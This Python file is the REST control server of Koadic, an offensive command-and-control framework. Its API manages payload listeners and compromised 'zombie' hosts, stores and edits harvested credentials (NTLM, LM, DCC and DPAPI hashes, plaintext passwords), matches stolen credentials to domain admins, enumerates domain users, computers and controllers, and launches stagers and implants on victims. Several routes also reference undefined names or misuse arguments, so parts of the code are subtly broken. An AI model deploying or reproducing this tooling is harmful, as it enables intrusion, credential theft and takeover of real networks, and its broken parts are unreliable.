import random, string, time, datetime, json, threading, sys, os

class KThread(threading.Thread):
    """
    A subclass of threading.Thread, with a kill() method.
    From https://web.archive.org/web/20130503082442/http://mail.python.org/pipermail/python-list/2004-May/281943.html
    """

    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run      # Force the Thread toinstall our trace.
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True

class RestServer():
    def __init__(self, shell, port, username, password, remote, secure):
        self.shell = shell
        self.username = username
        self.password = password
        self.port = port
        self.remote = remote
        self.secure = secure
        if self.secure:
            self.cert = self.secure[0]
            self.key = self.secure[1]
        self.token = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for n in range(42))
        self.domains = [] # crappy hack
        self.cred_mapping = {"username": "Username", 
                                "domain": "Domain",
                                "password": "Password",
                                "ntlm": "NTLM",
                                "lm": "LM",
                                "sha1": "SHA1",
                                "dcc": "DCC",
                                "dpapi": "DPAPI",
                                "ip": "IP",
                                "extra": "Extra"}

    def run(self):
        from flask import Flask, request, jsonify, make_response
        import logging
        rest_api = Flask("Koadic")
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        @rest_api.before_request
        def validate_token():
            if request.path != '/api/login':
                token = request.args.get('token')
                if not (token and self.token and token == self.token):
                    return make_response('', 401)

        @rest_api.before_request
        def crappy_domain_id_hack():
            if self.shell.domain_info:
                for k in self.shell.domain_info:
                    if k not in self.domains:
                        self.domains.append(k)

        @rest_api.errorhandler(Exception)
        def exception_handler(error):
            return repr(error)+"\n"

        @rest_api.errorhandler(404)
        def not_found(error):
            return make_response(jsonify(error='Not found'), 404)

        # Admin
        @rest_api.route('/api/login', methods=['POST'])
        def server_login():
            username = request.form['username']
            password = request.form['password']
            time.sleep(2)
            if username == self.username and password == self.password:
                return jsonify(token=self.token)
            else:
                return make_response('', 401)

        @rest_api.route('/api/version', methods=['GET'])
        def get_version():
            return jsonify(version=self.shell.version)

        @rest_api.route('/api/shutdown', methods=['GET'])
        def shutdown_server():
            self.shell.rest_thread = ""
            func = request.environ.get('werkzeug.server.shutdown')
            if func is not None:
                func()
            return jsonify(success=True)

        @rest_api.route('/api/help', methods=['GET'])
        def get_help():
            return jsonify(help="help")

        # Listeners
        @rest_api.route('/api/listeners', methods=['GET'])
        def get_listeners():
            if not self.shell.stagers:
                return jsonify(success=False, error="No payloads yet.")

            stager_list = []

            for stager in sorted([stager for keypair in [endpoint for port,endpoint in self.shell.stagers.items()] for endpoint, stager in keypair.items() if not stager.killed], key=lambda s:s.payload.id):
                stager_list.append({"payload_id":stager.payload.id, "hostname":stager.hostname, "port":stager.port, "module":stager.module})

            return jsonify(success=True, listeners=stager_list)

        @rest_api.route('/api/listeners/<string:listener_id>', methods=['GET', 'DELETE'])
        def listener(listener_id):
            if request.method == 'GET':
                for stager in sorted([stager for keypair in [endpoint for port,endpoint in self.shell.stagers.items()] for endpoint, stager in keypair.items() if not stager.killed], key=lambda s:s.payload.id):
                    if str(stager.payload.id) == listener_id:
                        payload = stager.get_payload_data().decode()
                        return jsonify(success=True, payload=payload)
                return jsonify(success=False, error="No payload %s." % listener_id)

            elif request.method == 'DELETE':
                for stager in sorted([stager for keypair in [endpoint for port,endpoint in self.shell.stagers.items()] for endpoint, stager in keypair.items() if not stager.killed], key=lambda s:s.payload.id):
                    if str(stager.payload.id) == listener_id:
                        sessions = [session for skey, session in shell.sessions.items() if int(session.stager.payload.id) == int(listener_id) and not session.killed]

                        if len(sessions) > 0:
                            return jsonify(success=False, error="Zombies attached.", zombies=[str(s.id) for s in sessions])
                        else:
                            for session in sessions:
                                session.kill()
                            stager.killed = True
                            del self.shell.stagers[stager.port][stager.endpoint]
                            if not self.shell.stagers[stager.port]:
                                server = self.shell.servers[stager.port]
                                server.http.shutdown()
                                server.http.socket.close()
                                server.http.server_close()
                                del self.shell.servers[port]
                                del self.shell.stagers[port]
                            return jsonify(success=True)

                return jsonify(success=False, error="No payload %s." % listener_id)

        # Creds
        @rest_api.route('/api/creds', methods=['GET'])
        def get_creds():
            if not self.shell.creds:
                return jsonify(success=False, error="No credentials have been gathered yet.")

            self.condense_creds()
            results = []
            for key in self.shell.creds_keys:
                if (self.shell.creds[key]["Username"][-1] == '$' or
                    (not self.shell.creds[key]["Password"] and
                        not self.shell.creds[key]["NTLM"]) or
                    self.shell.creds[key]["NTLM"] == '31d6cfe0d16ae931b73c59d7e0c089c0'):

                    continue
                else:
                    result_cred = dict(self.shell.creds[key])
                    result_cred["Cred ID"] = str(self.shell.creds_keys.index(key))
                    results.append(result_cred)

            return jsonify(success=True, creds=results)

        @rest_api.route('/api/creds/all', methods=['GET'])
        def get_all_creds():
            if not self.shell.creds:
                return jsonify(success=False, error="No credentials have been gathered yet.")

            self.condense_creds()
            results = []
            for key in self.shell.creds_keys:
                creds = dict(self.shell.creds[key])
                creds["Cred ID"] = self.shell.creds_keys.index(key)
                results.append(creds)

            return jsonify(success=True, creds=results)

        @rest_api.route('/api/creds/user/<int:cred_id>', methods=['GET'])
        def get_user_creds(cred_id):
            if not self.shell.creds:
                return jsonify(success=False, error="No credentials have been gathered yet.")

            self.condense_creds()
            key = self.shell.creds_keys[cred_id]
            return jsonify(success=True, creds=self.shell.creds[key])

        @rest_api.route('/api/creds/das/<int:domain_id>', methods=['GET'])
        def get_das(domain_id):
            if not self.shell.creds:
                return jsonify(success=False, error="No credentials have been gathered yet.")

            if domain_id > len(self.domains) or domain_id < 0:
                return jsonify(success=False, error="Not a valid Domain ID.")

            domain_key = self.domains[domain_id]
            if not "Domain Admins" in self.shell.domain_info[domain_key]:
                return jsonify(success=False, error="Domain Admins not gathered for target domain.")

            self.condense_creds()
            results = []
            das = self.shell.domain_info[domain_key]["Domain Admins"]
            for key in self.shell.creds_keys:
                creduser = self.shell.creds[key]["Username"]
                creddomain = self.shell.creds[key]["Domain"]
                credpass = self.shell.creds[key]["Password"]
                credntlm = self.shell.creds[key]["NTLM"]
                if (creduser.lower() in das and
                    (creddomain.lower() == domain_key[0].lower() or
                        creddomain.lower() == domain_key[1].lower()) and
                    (credpass or
                        credntlm)):

                    cred = dict(self.shell.creds[key])
                    cred["Cred ID"] = self.shell.creds_keys.index(key)
                    results.append(cred)

            if results:
                return jsonify(success=True, creds=results)
            else:
                return jsonify(success=False, error="Usable credentials not gathered yet.")

        @rest_api.route('/api/creds/<int:cred_id>', methods=['PUT', 'DELETE'])
        def manip_creds(cred_id):
            if request.method == 'DELETE':
                if not self.shell.creds:
                    return jsonify(success=False, error="No credentials have been gathered yet.")
                if cred_id > len(self.shell.creds_keys) or cred_id < 0:
                    return jsonify(success=False, error="Not a valid Cred ID")

                key = self.shell.creds_keys[cred_id]
                del self.shell.creds[key]
                self.shell.creds_keys.remove(key)
                return jsonify(success=True)


            elif request.method == 'PUT':
                try:
                    req_cred = json.loads(request.data)
                except:
                    return jsonify(success=False, error="Expected valid JSON object as data.")
                new_cred = {}
                for k in req_cred:
                    if k.lower() not in self.cred_mapping:
                        return jsonify(success=False, error="Unknown field: %s" % str(k))
                    if k.lower() == "extra":
                        for subk in req_cred[k]:
                            if subk.lower() not in self.cred_mapping:
                                return jsonify(success=False, error="Unknown Extra field: %s." % str(subk))
                            elif subk.lower() == "extra" or subk.lower() == "username" or subk.lower() == "domain":
                                return jsonify(success=False, error="No Extra field available for \"%s\"." % str(subk))
                    new_cred[self.cred_mapping[k.lower()]] = req_cred[k]

                new_keys = list(new_cred.keys())

                # new cred
                if cred_id >= len(self.shell.creds_keys) or not self.shell.creds_keys:
                    if "Username" not in new_keys or "Domain" not in new_keys:
                        return jsonify(success=False, error="Username and Domain are required to add a new credential.")
                    else:
                        new_cred_key = (new_cred["Domain"].lower(), new_cred["Username"].lower())
                        new_cred_key_2 = ""
                        if self.shell.domain_info and [d for d in domain_info if new_cred_key[0] in d]:
                            domain_key = [d for d in domain_info if new_cred_key[0] in d][0]
                            other_domain = [d for d in domain_key if d != new_cred[0]][0]
                            new_cred_key_2 = (other_domain, new_cred_key[1])
                        if new_cred_key in self.shell.creds_keys or new_cred_key_2 in self.shell.creds_keys:
                            return jsonify(success=False, error="User already in creds: Cred ID %s." % str(self.shell.creds_keys.index(new_cred_key)))

                    if "IP" not in new_keys:
                        new_cred["IP"] = "Manually added"

                    cred = {}
                    cred["IP"] = ""
                    cred["Domain"] = ""
                    cred["Username"] = ""
                    cred["Password"] = ""
                    cred["NTLM"] = ""
                    cred["SHA1"] = ""
                    cred["DCC"] = ""
                    cred["DPAPI"] = ""
                    cred["LM"] = ""
                    cred["Extra"] = {}
                    cred["Extra"]["IP"] = []
                    cred["Extra"]["Password"] = []
                    cred["Extra"]["NTLM"] = []
                    cred["Extra"]["SHA1"] = []
                    cred["Extra"]["DCC"] = []
                    cred["Extra"]["DPAPI"] = []
                    cred["Extra"]["LM"] = []

                    for k in new_cred:
                        cred[k] = new_cred[k]

                    self.shell.creds_keys.append(new_cred_key)
                    self.shell.creds[new_cred_key] = cred
                    return jsonify(success=True, cred_id=self.shell.creds_keys.index(new_cred_key))

                # update cred
                else:
                    old_cred_key = self.shell.creds_keys[cred_id]
                    if "Username" in new_keys or "Domain" in new_keys:
                        if "Username" in new_keys and "Domain" in new_keys:
                            new_cred_key = (new_cred["Domain"].lower(), new_cred["Username"].lower())
                        else:
                            if "Username" in new_keys:
                                new_cred_key = (old_cred_key[0], new_cred["Username"].lower())
                            elif "Domain" in new_keys:
                                new_cred_key = (new_cred["Domain"].lower(), old_cred_key[1])
                    else:
                        new_cred_key = old_cred_key

                    old_cred = dict(self.shell.creds[old_cred_key])
                    for k in new_keys:
                        new_val = new_cred[k]
                        if old_cred[k]:
                            if k not in ["Username", "Domain", "Extra"]:
                                if new_val in old_cred["Extra"][k]:
                                    old_cred["Extra"][k].remove(new_val)
                                if new_val != old_cred[k]:
                                    old_cred["Extra"][k].append(old_cred[k])
                            elif k == "Extra":
                                for subk in new_keys[k]:
                                    old_cred[k][subk] = old_cred[k][subk] + new_val[subk]

                        if k != "Extra":
                            old_cred[k] = new_val

                    del self.shell.creds[old_cred_key]
                    self.shell.creds[new_cred_key] = old_cred
                    self.shell.creds_keys[cred_id] = new_cred_key

                    return jsonify(success=True)

        # Domain
        @rest_api.route('/api/domains', methods=['GET'])
        def get_domains():
            if not self.domains:
                return jsonify(success=False, error="No domain information has been gathered yet.")
            results = []
            for d in self.domains:
                res_d = {}
                res_d["ID"] = self.domains.index(d)
                res_d["FQDN"] = d[0]
                res_d["NetBIOS"] = d[1]
                results.append(res_d)

            return jsonify(success=True, domains=results)

        @rest_api.route('/api/domain/all/<int:domain_id>', methods=['GET'])
        def get_domain_all(domain_id):
            if not self.domains:
                return jsonify(success=False, error="No domain information has been gathered yet.")
            if domain_id > len(self.domains) or domain_id < 0:
                return jsonify(success=False, error="Not a valid Domain ID.")

            return jsonify(success=True, results=self.shell.domain_info[self.domains[domain_id]])

        @rest_api.route('/api/domain/admins/<int:domain_id>', methods=['GET'])
        def get_domain_admins(domain_id):
            if not self.domains:
                return jsonify(success=False, error="No domain information has been gathered yet.")
            if domain_id > len(self.domains) or domain_id < 0:
                return jsonify(success=False, error="Not a valid Domain ID.")

            return jsonify(success=True, results=self.shell.domain_info[self.domains[domain_id]]["Domain Admins"])

        @rest_api.route('/api/domain/users/<int:domain_id>', methods=['GET'])
        def get_domain_users(domain_id):
            if not self.domains:
                return jsonify(success=False, error="No domain information has been gathered yet.")
            if domain_id > len(self.domains) or domain_id < 0:
                return jsonify(success=False, error="Not a valid Domain ID.")

            return jsonify(success=True, results=self.shell.domain_info[self.domains[domain_id]]["Domain Users"])

        @rest_api.route('/api/domain/passpolicy/<int:domain_id>', methods=['GET'])
        def get_domain_password_policy(domain_id):
            if not self.domains:
                return jsonify(success=False, error="No domain information has been gathered yet.")
            if domain_id > len(self.domains) or domain_id < 0:
                return jsonify(success=False, error="Not a valid Domain ID.")

            return jsonify(success=True, results=self.shell.domain_info[self.domains[domain_id]]["Password Policy"])

        @rest_api.route('/api/domain/computers/<int:domain_id>', methods=['GET'])
        def get_domain_computers(domain_id):
            if not self.domains:
                return jsonify(success=False, error="No domain information has been gathered yet.")
            if domain_id > len(self.domains) or domain_id < 0:
                return jsonify(success=False, error="Not a valid Domain ID.")

            return jsonify(success=True, results=self.shell.domain_info[self.domains[domain_id]]["Domain Computers"])

        @rest_api.route('/api/domain/controllers/<int:domain_id>', methods=['GET'])
        def get_domain_controllers(domain_id):
            if not self.domains:
                return jsonify(success=False, error="No domain information has been gathered yet.")
            if domain_id > len(self.domains) or domain_id < 0:
                return jsonify(success=False, error="Not a valid Domain ID.")

            return jsonify(success=True, results=self.shell.domain_info[self.domains[domain_id]]["Domain Controllers"])

        # Zombies
        @rest_api.route('/api/zombies', methods=['GET'])
        def get_zombies():
            all_sessions = [session for skey, session in self.shell.sessions.items()]

            if not all_sessions:
                return jsonify(success=False, error="No live zombies.")
            all_sessions.sort(key=lambda s: s.id)

            cur_sessions = []
            for session in all_sessions:
                if not session.killed:
                    cur_sessions.append(session)

            results = []
            for session in cur_sessions:
                res_z = {}
                res_z["ID"] = str(session.id)
                res_z["IP"] = session.ip
                res_z["Status"] = "Alive" if session.status == 1 else "Dead"
                res_z["Last Seen"] = datetime.datetime.fromtimestamp(session.last_active).strftime('%Y-%m-%d %H:%M:%S')
                res_z["Elevated"] = True if session.elevated == session.ELEVATED_TRUE else False
                results.append(res_z)
            return jsonify(success=True, zombies=results)

        @rest_api.route('/api/zombies/<int:zombie_id>', methods=['GET'])
        def get_zombie(zombie_id):
            all_sessions = [session for skey, session in self.shell.sessions.items()]
            if not all_sessions:
                return jsonify(success=False, error="No live zombies.")
            if zombie_id > len(all_sessions) or zombie_id < 0:
                return jsonify(success=False, error="Not a valid Zombie ID.")
            all_sessions.sort(key=lambda s: s.id)

            for session in all_sessions:
                if session.id == zombie_id:
                    res_z = {}
                    res_z["Status"] = "Alive" if session.status == session.ALIVE else "Dead"
                    res_z["First Seen"] = datetime.datetime.fromtimestamp(session.first_seen).strftime('%Y-%m-%d %H:%M:%S')
                    res_z["Last Seen"] = datetime.datetime.fromtimestamp(session.last_active).strftime('%Y-%m-%d %H:%M:%S')
                    res_z["Staged From"] = session.origin_ip
                    res_z["Listener"] = session.stager.payload_id
                    res_z["IP"] = session.ip
                    res_z["User"] = session.user
                    res_z["Hostname"] = session.computer
                    res_z["Primary DC"] = session.dc
                    res_z["OS"] = session.os
                    res_z["OSArch"] = session.arch
                    res_z["Elevated"] = True if session.elevated == session.ELEVATED_TRUE else False
                    res_z["User Agent"] = session.user_agent
                    res_z["Session Key"] = session.key

            return jsonify(success=True, results=res_z)

        @rest_api.route('/api/zombies/killed', methods=['GET'])
        def get_killed_zombies(zombie_id):
            all_sessions = [session for skey, session in self.shell.sessions.items()]
            if not all_sessions:
                return jsonify(success=False, error="No zombies.")
            all_sessions.sort(key=lambda s: s.id)

            cur_sessions = []
            for session in all_sessions:
                if session.killed:
                    cur_sessions.append(session)

            if not cur_sessions:
                return jsonify(success=False, error="No killed zombies.")

            results = []
            for session in cur_sessions:
                res_z = {}
                res_z["ID"] = str(session.id)
                res_z["IP"] = session.ip
                res_z["Last Seen"] = datetime.datetime.fromtimestamp(session.last_active).strftime('%Y-%m-%d %H:%M:%S')
                res_z["Elevated"] = True if session.elevated == session.ELEVATED_TRUE else False
                results.append(res_z)
            return jsonify(success=True, zombies=results)

        # Jobs
        @rest_api.route('/api/jobs', methods=['GET'])
        def get_all_jobs():
            results = []
            for jkey, job in self.shell.jobs.items():
                res_j = {}
                res_j["ID"] = job.id
                res_j["Status"] = job.status_string()
                res_j["Zombie"] = session.id
                res_j["Name"] = job.name
                results.append(res_j)
            if results:
                return jsonify(success=True, jobs=results)
            else:
                return jsonify(success=False, error="No jobs.")

        @rest_api.route('/api/jobs/<int:job_id>', methods=['GET'])
        def get_job(job_id):
            for jkey, job in self.shell.jobs.items():
                if job.id == job_id:
                    return jsonify(success=True, results=job.results)
            return jsonify(success=False, error="Job does not exist.")

        # Modules
        @rest_api.route('/api/stager/<string:s_type>/<string:s_name>', methods=['GET', 'POST'])
        def stagers(s_type, s_name):
            if request.method == 'GET':
                stager = 'stager/%s/%s' % (s_type, s_name)
                try:
                    plugin = self.shell.plugins[stager]
                except:
                    return jsonify(success=False, error="Not a valid stager.")

                results = []
                for p in plugin.options.options:
                    if p.hidden:
                        continue
                    res_p = {}
                    res_p["Name"] = p.name
                    res_p["Description"] = p.description
                    res_p["Value"] = p.value
                    res_p["Required"] = p.required
                    results.append(res_p)
                return jsonify(success=True, results=results)

            elif request.method == 'POST':
                stager = 'stager/%s/%s' % (s_type, s_name)
                try:
                    plugin = self.shell.plugins[stager]
                except:
                    return jsonify(success=False, error="Not a valid stager.")

                for k in request.form:
                    try:
                        plugin.options.set(k.upper(), str(request.form[k]))
                    except:
                        return jsonify(success=False, error="Invalid option or value: %s = %s" % (k, request.form[k]))

                try:
                    stagecmd = plugin.run()
                    if stagecmd:
                        return jsonify(success=True, stagecmd=stagecmd)
                    return jsonify(success=False, error="Couldn't run stager")
                except:
                    return jsonify(success=False, error="Couldn't run stager")

        @rest_api.route('/api/implant/<string:i_type>/<string:i_name>', methods=['GET', 'POST'])
        def implants(i_type, i_name):
            if request.method == 'GET':
                implant = 'implant/%s/%s' % (i_type, i_name)
                try:
                    plugin = self.shell.plugins[implant]
                except:
                    return jsonify(success=False, error="Not a valid implant.")

                results = []
                for p in plugin.options.options:
                    if p.hidden:
                        continue
                    res_p = {}
                    res_p["Name"] = p.name
                    res_p["Description"] = p.description
                    res_p["Value"] = p.value
                    res_p["Required"] = p.required
                    results.append(res_p)
                return jsonify(success=True, results=results)

            elif request.method == 'POST':
                implant = 'implant/%s/%s' % (i_type, i_name)
                try:
                    plugin = self.shell.plugins[implant]
                except:
                    return jsonify(success=False, error="Not a valid stager.")

                for k in request.form:
                    try:
                        plugin.options.set(k.upper(), str(request.form[k]))
                    except:
                        return jsonify(success=False, error="Invalid option or value: %s = %s" % (k, request.form[k]))

                try:
                    plugin.run()
                except:
                    return jsonify(success=False, error="Couldn't run implant")

                if plugin.ret_jobs:
                    return jsonify(success=True, jobs=plugin.ret_jobs)
                else:
                    return jsonify(success=False, error="Couldn't dispatch jobs")

        if self.remote:
            if self.secure: rest_api.run(host='0.0.0.0', port=int(self.port), threaded=True, ssl_context=(self.cert, self.key))
            else: rest_api.run(host='0.0.0.0', port=int(self.port), threaded=True)
        else: rest_api.run(host='127.0.0.1', port=int(self.port), threaded=True)

    def condense_creds(self):
        bad_keys = []
        for key in self.shell.creds_keys:
            if self.shell.creds[key]["Username"] == "(null)":
                bad_keys.append(key)

        if bad_keys:
            new_creds = dict(self.shell.creds)
            for key in bad_keys:
                del new_creds[key]
                self.shell.creds_keys.remove(key)
            self.shell.creds = new_creds



if __name__ == '__main__':
    class Shell():
        def __init__(self):
            self.version = "1.0"
            self.domain_info = {"test": "test"}

    shell = Shell();
    rest_server = RestServer(shell)
    rest_server.run()
